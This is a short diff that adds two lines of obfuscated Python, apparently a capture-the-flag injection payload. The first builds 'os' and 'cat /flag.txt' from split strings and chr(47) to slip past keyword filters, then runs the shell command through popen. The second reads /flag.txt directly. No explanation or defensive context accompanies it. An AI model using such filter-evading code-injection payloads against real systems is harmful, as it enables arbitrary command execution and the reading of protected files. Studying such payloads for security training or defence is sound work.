@@ -1,0 +1,3 @@
+__import__('o'+'s').popen('ca'+'t '+chr(47)+'flag.'+'txt').read()
+
+open(chr(47)+'flag.'+'txt').read()
